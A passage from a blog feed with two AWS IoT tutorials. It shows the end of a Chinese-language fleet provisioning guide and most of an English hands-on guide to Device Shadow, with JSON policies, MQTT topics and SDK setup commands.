class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;iot:Publish&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;arn:aws:iot:us-east-1:123456789012:topic/foo/bar&quot;</span><span class="punctuation">]</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;DeviceConfiguration&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;FallbackUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.example.com/test-site&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;LocationUrl&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Fn::FindInMap&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;LocationTable&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;Ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;DeviceLocation&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="string">&quot;LocationUrl&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>預先佈建掛接是 Lambda 函數，會先驗證從裝置傳遞的參數，然後才能佈建裝置。此 Lambda 函數必須存在於您的帳戶中，才能佈建裝置。</p><p>這個部分是要設定在配置設備之前執行操作。例如，根據已知設備數據庫檢查設備，以防止未經授權的設備連接到您的帳戶。</p><p><img src="https://i.imgur.com/pL1yTCM.png" alt="Imgur"></p><ul><li>選擇 <strong>Create a Lambda function</strong></li></ul><h3 id="Sample-provisioning-hook-where-you-validate-the-request-before-activating-a-certificate"><a href="#Sample-provisioning-hook-where-you-validate-the-request-before-activating-a-certificate" class="headerlink" title="Sample provisioning hook where you validate the request before activating a certificate"></a>Sample provisioning hook where you validate the request before activating a certificate</h3><blockquote><p>Github: <a href="https://github.com/aws-samples/aws-iot-fleet-provisioning#sample-provisioning-hook-where-you-validate-the-request-before-activating-a-certificate">https://github.com/aws-samples/aws-iot-fleet-provisioning#sample-provisioning-hook-where-you-validate-the-request-before-activating-a-certificate</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> date</span><br><span class="line"></span><br><span class="line">provision_response = &#123;</span><br><span class="line">    <span class="string">&#x27;allowProvisioning&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">    <span class="string">&quot;parameterOverrides&quot;</span>: &#123;<span class="string">&quot;CertDate&quot;</span>: date.today().strftime(<span class="string">&quot;%m/%d/%y&quot;</span>)&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handler</span>(<span class="params">event, context</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">########################</span></span><br><span class="line">    <span class="comment">## Stringent validation against internal API&#x27;s/DB etc to validate the request before proceeding</span></span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    <span class="comment">## if event[&#x27;parameters&#x27;][&#x27;SerialNumber&#x27;] = &quot;approved by company CSO&quot;:</span></span><br><span class="line">    <span class="comment">##     provision_response[&quot;allowProvisioning&quot;] = True</span></span><br><span class="line">    <span class="comment">#####################</span></span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> provision_response</span><br></pre></td></tr></table></figure><h3 id="Hook-Input"><a href="#Hook-Input" class="headerlink" title="Hook Input"></a>Hook Input</h3><blockquote><p><a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/pre-provisioning-hook.html#pre-provisioning-hook-input">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/pre-provisioning-hook.html#pre-provisioning-hook-input</a></p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;claimCertificateId&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;certificateId&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;certificatePem&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;templateArn&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;arn:aws:iot:us-east-1:XXXXXXXXXXXX:provisioningtemplate/MyTemplate&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;clientId&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;221a6d10-9c7f-42f1-9153-e52e6fc869c1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;parameters&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;string&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>向 AWS IoT 註冊裝置時，AWS IoT 會將此物件傳送至 Lambda 函數。</p><p>傳遞給 Lambda 函數的 <code>parameters</code> 物件包含在 <strong>RegisterThing</strong> 請求 Payload中傳遞之 parameters 引數中的屬性</p><h2 id="設置-設備端"><a href="#設置-設備端" class="headerlink" title="設置 - 設備端"></a>設置 - 設備端</h2><p>所下載的 Claim 憑證和私鑰會需要移動到設備端</p><p>可以通過像是 <code>scp</code> 之類的命令來去透過 SSH 將本地複製檔案到您的設備中。</p><p>另外，會需要在設備端去安裝想要使用的 <strong>IoT Device SDK</strong></p><blockquote><p>AWS IoT 裝置 SDK、行動 SDK 和 AWS IoT 裝置用戶端 - <a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/iot-sdks.html">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/iot-sdks.html</a></p></blockquote><p>目前有支援以 C++, javascript, Java, Python, Embedded-C 語言撰寫的 Device SDK，可以根據實際需求和情境進行使用。</p><h3 id="使用-AWS-IoT-Device-SDK"><a href="#使用-AWS-IoT-Device-SDK" class="headerlink" title="使用 AWS IoT Device SDK"></a>使用 AWS IoT Device SDK</h3><blockquote><p><a href="https://github.com/aws/aws-iot-device-sdk-python-v2">https://github.com/aws/aws-iot-device-sdk-python-v2</a></p></blockquote><p>本篇文章主要使用 <strong>Python IoT Device SDKv2</strong></p><p>若要安裝 SDK 到設備，請先確認設備上是否有 <code>git</code> , <code>Python3</code>還有 <code>Python3-pip</code>套件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/aws/aws-iot-device-sdk-python-v2.git</span><br></pre></td></tr></table></figure><p>初始化套件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#  (Optional) Setup the version number of your local build. The default version </span><br><span class="line">#    for awsiotsdk is set to &quot;1.0.0-dev&quot;, you can set the version number of the</span><br><span class="line">#    local build in &quot;aws-iot-device-sdk-python-v2/awsiot/__init__.py&quot;</span><br><span class="line">sed -i &quot;s/__version__ = &#x27;1.0.0-dev&#x27;/__version__ = &#x27;&lt;SDK_VERSION&gt;&#x27;/&quot; \</span><br><span class="line">  aws-iot-device-sdk-python-v2/awsiot/__init__.py</span><br><span class="line"></span><br><span class="line">#  Install using Pip (use &#x27;python&#x27; instead of &#x27;python3&#x27; on Windows)</span><br><span class="line">python3 -m pip install ./aws-iot-device-sdk-python-v2</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 <code>aws-iot-device-sdk-python-v2/samples/fleetprovisioning.py</code> 你也可以通過教本來去設置 Provisioning Template。</p><p>而後續您需要在您的設備上指定：</p><ul><li>AWS IoT Endpoint</li><li>Claim Certificate</li><li>Private Key<br>來去連接到 AWS IoT Core</li></ul><p>腳本的操作步驟可以在下面找到</p><blockquote><p><a href="https://github.com/aws/aws-iot-device-sdk-python-v2/blob/main/samples/fleetprovisioning.md">https://github.com/aws/aws-iot-device-sdk-python-v2/blob/main/samples/fleetprovisioning.md</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 fleetprovisioning.py --endpoint &lt;endpoint&gt; --cert &lt;file&gt; --key &lt;file&gt; --template_name &lt;name&gt; --template_parameters &#x27;&#123;\&quot;SerialNumber\&quot;:\&quot;1\&quot;,\&quot;DeviceLocation\&quot;:\&quot;Seattle\&quot;&#125;&#x27; --csr &lt;path to csr file&gt;</span><br></pre></td></tr></table></figure><h2 id="參考文件"><a href="#參考文件" class="headerlink" title="參考文件"></a>參考文件</h2><p>[+] <a href="https://github.com/aws-samples/aws-iot-fleet-provisioning">https://github.com/aws-samples/aws-iot-fleet-provisioning</a><br>[+] <a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/iot-provision.html">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/iot-provision.html</a><br>[+] <a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/provision-wo-cert.html#claim-based">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/provision-wo-cert.html#claim-based</a><br>[+] <a href="https://aws.amazon.com/tw/blogs/iot/how-to-automate-onboarding-of-iot-devices-to-aws-iot-core-at-scale-with-fleet-provisioning/">https://aws.amazon.com/tw/blogs/iot/how-to-automate-onboarding-of-iot-devices-to-aws-iot-core-at-scale-with-fleet-provisioning/</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> IoT Core </tag>
            
            <tag> Certificate </tag>
            
            <tag> Device Provisioning </tag>
            
            <tag> Policy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hands-On Practice: AWS IoT Device Shadow</title>
      <link href="/posts/aws-iot-device-shadow.html"/>
      <url>/posts/aws-iot-device-shadow.html</url>
      
        <content type="html"><![CDATA[<h1 id="Intro-What-is-AWS-IoT-Device-Shadow"><a href="#Intro-What-is-AWS-IoT-Device-Shadow" class="headerlink" title="Intro - What is AWS IoT Device Shadow?"></a>Intro - What is AWS IoT Device Shadow?</h1><p>In real world, sometime it is difficult to get the actual device state in real time in such IoT scenarios.</p><p>A device shadow can overcome this challenge, Device Shadow can consider a virtual  virtual representation of a device which managed by the <strong>IoT Things</strong> resource created in AWS IoT Core.</p><blockquote><p>The Shadow document is a JSON or a JavaScript notation doc that is used to store and retrieve the current state information for a device. You can use the shadow to get and set the state of a device over MQTT topics or HTTP REST APIs, regardless of whether the device is connected to the internet.</p></blockquote><h1 id="Shadow-Document"><a href="#Shadow-Document" class="headerlink" title="Shadow Document"></a>Shadow Document</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;green&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;delta&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;green&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">   <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Refer to the json above, you can check there 3 <strong>state</strong> properties in shadow document.</p><ul><li>desired<ul><li>Apps specify the desired states of device properties by updating the desired object</li></ul></li><li>reported<ul><li>Devices report their current state in the reported object.</li></ul></li><li>delta<ul><li>AWS IoT reports differences between the desired and the reported state in the delta object.</li></ul></li></ul><blockquote><p>You can consider the flow of Shadow a finite state machine, for AWS IoT Core, it will also check if there are delta event, that means there difference between <strong>Desired</strong> and <strong>Reported</strong> states</p></blockquote><p>So how can we update the state of a shadow?  The answer is clear,</p><blockquote><p><strong>By subscribing&#x2F;publishing messages to the certain MQTT topics</strong></p></blockquote><h1 id="Shadow-Topic"><a href="#Shadow-Topic" class="headerlink" title="Shadow Topic"></a>Shadow Topic</h1><table><thead><tr><th>ShadowTopicPrefix value</th><th>Shadow type</th></tr></thead><tbody><tr><td>$aws&#x2F;things&#x2F;<code>thingName</code>&#x2F;shadow</td><td>Unnamed (classic) shadow</td></tr><tr><td>$aws&#x2F;things&#x2F;<code>thingName</code>&#x2F;shadow&#x2F;name&#x2F;shadowName</td><td>Named shadow</td></tr></tbody></table><table><thead><tr><th>Topic</th><th>Client operations allowed</th></tr></thead><tbody><tr><td><code>ShadowTopicPrefix</code>&#x2F;delete</td><td>Publish&#x2F;Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;delete&#x2F;accepted</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;delete&#x2F;rejected</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;get</td><td>Publish&#x2F;Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;get&#x2F;accepted</td><td>Publish&#x2F;Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;get&#x2F;rejected</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update</td><td>Publish&#x2F;Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update&#x2F;accepted</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update&#x2F;rejected</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update&#x2F;delta</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update&#x2F;documents</td><td>Subscribe</td></tr></tbody></table><blockquote><p>For detail explanation about these shadow topics, see the documentation - <a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/device-shadow-mqtt.html">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/device-shadow-mqtt.html</a></p></blockquote><h1 id="The-state-changes-of-Device-Shadow"><a href="#The-state-changes-of-Device-Shadow" class="headerlink" title="The state changes of Device Shadow"></a>The state changes of Device Shadow</h1><p><img src="https://i.imgur.com/l071JEc.png" alt="Imgur"></p><p>Take this picture for example, the update flow is:</p><ol><li>The MQTT client publishes a <code>$aws/things/myLightBulb/shadow/update</code> message to the server. The message carries the desired state <code>&#123;&quot;state&quot;: &#123;&quot;desired&quot;:&#123;&quot;color&quot;:&quot;green&quot;&#125;&#125;&#125;</code></li><li>IoT Server responds with <code>$aws/things/myLightBulb/shadow/accepted</code>, indicating that the update message has been received. At the same time, it publishes <code>$aws/things/myLightBulb/shadow/delta</code> to notify the device to update, and then publishes <code>$aws/things/myLightBulb/shadow/update/document</code> as update record</li><li>After receiving the message, the Device performs the corresponding update operation and publishes a message <code>$aws/things/myLightBulb/shadow/update</code> <code>&#123;&quot;state&quot;&#123;&quot;report&quot;:&#123;&quot;color&quot;:&quot;green&quot;&#125;&#125;&#125;</code> to the IoT Server after completion. Notification updated</li><li>After receiving the post-update message, IoT Server responds with <code>$aws/things/myLightBulb/shadow/accepted</code> to indicate that the update message has been received. Publish another <code>$aws/things/myLightBulb/shadow/update/document</code> as an update record</li></ol><h1 id="Expermient-for-IoT-Shadow"><a href="#Expermient-for-IoT-Shadow" class="headerlink" title="Expermient for IoT Shadow"></a>Expermient for IoT Shadow</h1><h2 id="Device-Setup"><a href="#Device-Setup" class="headerlink" title="Device Setup"></a>Device Setup</h2><p>Since I don’t have any IoT Device currently available, I simulate the device by launching a EC2 instance.</p><ul><li>AMI: <code>Ubuntu 22 LTS</code></li><li>Type: <code>t2.Micro</code></li><li>Subnet: <code>10.1.0.0/24</code></li></ul><p>Then connect to the EC2 instance by using SSH, and run the following command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y python3-pip</span><br><span class="line">mkdir certs/</span><br></pre></td></tr></table></figure><h2 id="Setup-in-AWS-IoT-Core"><a href="#Setup-in-AWS-IoT-Core" class="headerlink" title="Setup in AWS IoT Core"></a>Setup in AWS IoT Core</h2><p>There are 3 things to setup in AWS IoT Core</p><ul><li>Create certificate</li><li>Create IoT Policy and associated with the certificate</li><li>Create Things object and associate with the certificate</li></ul><h3 id="Things"><a href="#Things" class="headerlink" title="Things"></a>Things</h3><p>This is a thing named <code>ESP32</code> for testing purposes, it have associated with the certificate</p><p><img src="https://i.imgur.com/96y4cVz.png" alt="Imgur"></p><h3 id="Certificate"><a href="#Certificate" class="headerlink" title="Certificate"></a>Certificate</h3><p>And this certificate has issued by the Amazon Root CA.</p><p><img src="https://i.imgur.com/Hg9Jzsv.png" alt="Imgur"></p><p>And there are IoT Policy - <code>TestPolicy</code> asccociate with this certificate.</p><p><em>TestPolicy</em></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Publish&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/get&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/update&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Receive&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/get/accepted&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/get/rejected&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/update/accepted&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/update/rejected&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/update/delta&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Subscribe&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/get/accepted&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:rus-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/get/rejected&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/update/accepted&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/update/rejected&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/update/delta&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Connect&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Remember, this policy must have adequate permissions for <code>CONNECT</code>, <code>SUBSCRIBE</code>, <code>Publish</code> and <code>Publish</code><br>to the Shadow topic.</p><p>Once you have setup these stuff, now I need to convey the certificate to the EC2 instance.</p><p><img src="https://i.imgur.com/LKSyMJw.png" alt="Imgur"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -i &lt;SSH KEY&gt; TestDeviceShadow/*    ubuntu@ec2-&lt;EC2 Public Address&gt;.compute-1.amazonaws.com:/home/ubuntu/certs</span><br></pre></td></tr></table></figure><p>Apart from the device certificate, it is necessary to provide the CA certificate in the device.</p><ul><li>Download the CA Cert in the device</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd certs/</span><br><span class="line">curl -o ~/certs/Amazon-root-CA-1.pem \</span><br><span class="line">    https://www.amazontrust.com/repository/AmazonRootCA1.pem </span><br></pre></td></tr></table></figure><p>Now there all credential we need to test the IoT Device Shadows</p><h2 id="Install-the-IoT-Core-Python-Device-SDK"><a href="#Install-the-IoT-Core-Python-Device-SDK" class="headerlink" title="Install the IoT Core Python Device SDK"></a>Install the IoT Core Python Device SDK</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/aws/aws-iot-device-sdk-python-v2.git</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i &quot;s/__version__ = &#x27;1.0.0-dev&#x27;/__version__ = &#x27;&lt;SDK_VERSION&gt;&#x27;/&quot; \</span><br><span class="line">  aws-iot-device-sdk-python-v2/awsiot/__init__.py</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install ./aws-iot-device-sdk-python-v2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/aws-iot-device-sdk-python-v2/samples</span><br></pre></td></tr></table></figure><h2 id="Execute-the-shadow-py"><a href="#Execute-the-shadow-py" class="headerlink" title="Execute the shadow.py"></a>Execute the shadow.py</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 shadow.py --ca_file ~/certs/Amazon-root-CA-1.pem --cert ~/certs/device.pem.crt --key ~/certs/private.pem.key --endpoint your-iot-endpoint --thing_name your-iot-thing-name</span><br></pre></td></tr></table></figure><blockquote><p>You can derive the iot endpoint by checking the AWS IoT Console<br>Find the <strong>Connect</strong> &gt; <strong>Connect One Device</strong> in the left pane<br>Scroll down and you will see the IoT endpoint</p></blockquote><p><img src="https://i.imgur.com/mDBpV7l.png" alt="Imgur"></p><p>Back to the script, after you execute the <code>shadow.py</code>, you will see the prompt in your terminal</p><p><img src="https://i.imgur.com/necUKaZ.png" alt="Imgur"></p><p>You will need to enter the desired value. So I enter “yellow”.</p><p><img src="https://i.imgur.com/CQOkk83.png" alt="Imgur"></p><p>Then you can observe that the state changed to “yellow”. This results may also observe from the AWS IoT Console</p><blockquote><p>Go to Things, and select your thing object, on the bottem of the target thing page, you can navigate to the <strong>Device Shadow</strong> tab, then select the <strong>Classic Shadow</strong>, then you can see the Device Shadow State below</p></blockquote><p><img src="https://i.imgur.com/KTfooA1.png" alt="Imgur"></p><p><img src="https://i.imgur.com/Xcu4BKk.png" alt="Imgur"></p><p>For testing, I enter “green” as the input of <code>shadow.py</code>.</p><p>And the state change show in both terminal and IoT Console</p><p><img src="https://i.imgur.com/AEEMMCa.png" alt="Imgur"></p><p><img src="https://i.imgur.com/BWi4UZh.png" alt="Imgur"></p><h2 id="Test-the-Shadow-Document"><a href="#Test-the-Shadow-Document" class="headerlink" title="Test the Shadow Document"></a>Test the Shadow Document</h2><p>Now you can try to edit the Shadow Document 